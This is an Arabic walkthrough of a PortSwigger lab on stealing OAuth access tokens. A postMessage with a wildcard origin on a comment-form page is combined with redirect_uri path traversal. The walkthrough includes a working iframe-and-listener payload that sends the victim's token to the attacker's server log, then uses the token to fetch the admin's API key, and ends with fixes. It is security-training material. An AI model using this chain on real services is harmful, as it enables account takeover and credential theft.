# [Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

## **`الهدف`**
قم بسرقة الـ `access token` الخاص بـحساب `admin` واستخدمه للحصول على الـ `API Key` الخاص به وقم بتقديمه كـ `Solution`.
## **`خطوات الحل`**

نقوم بالدخول إلى حساب `wiener:peter` بعد ذلك نتجول قليلًا في صفحات اللاب ونحاول فحص الـ `http history` وسنكتشف أن أى صفحة تدوينة على اللاب في الـ `response` الخاص بها `/post/comment/comment-form` 
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1510

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/css/labs.css rel=stylesheet>
    </head>
    <body>
        <script>
            parent.postMessage({type: 'onload', data: window.location.href}, '*')
            function submitForm(form, ev) {
                ev.preventDefault();
                const formData = new FormData(document.getElementById("comment-form"));
                const hashParams = new URLSearchParams(window.location.hash.substr(1));
                const o = {};
                formData.forEach((v, k) => o[k] = v);
                hashParams.forEach((v, k) => o[k] = v);
                parent.postMessage({type: 'oncomment', content: o}, '*');
                form.reset();
            }
        </script>
</html>

```

يوجد ثغرة في الجزء الخاص بـ `postMessage` حيث أنه يتم إستعمال طريقة `postMessage()` لإرسال خاصية `window.location.href` إلى النافذة الأب `(Parent Window)` والأهم من ذلك، أنها تسمح بنشر الرسائل إلى أي نطاق مصدري/ دومين `(*)`.

والمقصود هنا أن هذه الثغرة تسمح بإرسال الرابط الخاص بها كما هو إلى النافذة الأب أو الدومين المصدري الذي فتحها.

لذلك سنقوم بعمل `Path Traversal` بثغرة `Open redirect` عن طريق حقن كود `<iframe` ليتم إعادة التوجيه إلى صفحة التعليقات، بالإضافة إلى وضع جزء أخر من الكود `<script>` حيث يقوم بإستقبال الرابط الذي يقوم الكود المعيب الموجود في نافذة التعليقات بإرساله له، ومن ثم يظهر في الـ `log` الخاص بالسيرفر.

لكن قبل ذلك سنقوم بإحضار بعض البيانات من هذا الـ `request`
```http
GET /auth?client_id=te6vjtlrzne92tmo3tc0r&redirect_uri=https://0a8700a1041ea5da803267d4008100d1.web-security-academy.net/oauth-callback&response_type=token&nonce=-1926500683&scope=openid%20profile%20email HTTP/2
```

ثم سنقوم بالتوجه إلى السيرفر الموجود في اللاب ونقوم بوضع  الكود التالي في الـ `Body` مع تغيير الـ `URL` الخاص باللاب الحالي ووضع `URL` الخاص بالسيرفر ودمجه برابط صفحة التعليقات ثم وضعه بعد `redirect_uri` بالإضافة إلى تغيير الـ `client_id` و `nonce`.
```html
<iframe src="https://oauth-0aa100d304a6a5a980f66599026a0004.oauth-server.net/auth?client_id=te6vjtlrzne92tmo3tc0r&redirect_uri=https://0a8700a1041ea5da803267d4008100d1.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1926500683&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```

ونقوم بالضغط على `Store` ثم `Deliver exploit to victim` وبعد ذلك نتوجه إلى `Acces log` لنلاحظ وجود سطر يشبه التالي
```
10.0.4.165      2026-07-28 06:31:56 +0000 "GET /https%3A%2F%2F0a8700a1041ea5da803267d4008100d1.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DqSuHf-IA17yLLbSl8cBPlGrAy1Uwi716o5frMXXxmEK%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

فنقوم بنسخ الكود `qSuHf-IA17yLLbSl8cBPlGrAy1Uwi716o5frMXXxmEK` ونعود إلى الـ `http History` لنبحث عن هذا الـ `request`.
```http
GET /me HTTP/2
Host: oauth-0aa100d304a6a5a980f66599026a0004.oauth-server.net
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer 3h2wghgDlFajmBSLFEJnMWUQl6dpbz8oNP82p1X2rMX
```

ونقوم بإرساله إلى الـ `repeater` ثم نقوم بتعديل الجزء الذي يلي `Authorization: Bearer` إلى الكود الذي نسخناه ونقوم بإرساله وسنجد الـ `API Key` في الـ `response`.
```http
HTTP/2 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a8700a1041ea5da803267d4008100d1.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Tue, 28 Jul 2026 06:34:55 GMT
Keep-Alive: timeout=5
Content-Length: 152

{"sub":"administrator","apikey":"Mr1QiOYOqQhhLH5CE8SiQeJmX6XzlXFm","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

فنقوم بنسخه ثم التوجه إلى اللاب مرة أخرى ونضغط على `Submit Solution` ونضعه كـ `Answer` لننتهي من حل اللاب.

## **`ترقيع الثغرة`**

**`نفس ترقيع لاب`** [Stealing OAuth access tokens via an open redirect](./Stealing-OAuth-access-tokens-via-an-open-redirect.md)

ويجب تحديد النطاق المستهدف `Target Origin` بصرامة عن طريق استبدال `*` في الكود المعيب بالرابط الموثوق فقط مثل دومين التطبيق الأساسي، بحيث يرفض المتصفح تسليم الرسالة لأي دومين خارجي.

ويجب تقييد استخدام الإطارات `iframe` عن طريق إعداد ترويسات الحماية `HTTP Headers` من جهة السيرفر، مثل استخدام `X-Frame-Options: SAMEORIGIN` أو إعداد `Content-Security-Policy: frame-ancestors`، لمنع أي موقع خارجي من فتح الصفحة داخل إطار، مما يكسر سلسلة الهجوم `Attack Chain` من جذورها حتى لو ظل كود الجافاسكربت معيباً.
